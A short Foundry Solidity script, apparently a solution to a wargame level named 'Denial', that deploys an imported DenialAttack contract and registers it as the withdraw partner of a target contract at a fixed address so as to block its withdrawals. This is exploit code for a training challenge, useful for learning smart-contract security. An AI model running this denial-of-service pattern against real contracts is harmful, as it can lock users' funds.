// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Denial, DenialAttack} from "../src/Denial.sol";

contract DenialTest is Script {
    function run() public {
        vm.startBroadcast();
        Denial denial = Denial(payable(0x3f8f8CFEe8dd986F19EaeEdf775F44Ae461d07A0));
        DenialAttack attack = new DenialAttack();
        denial.setWithdrawPartner(address(attack));

        vm.stopBroadcast();
    }
}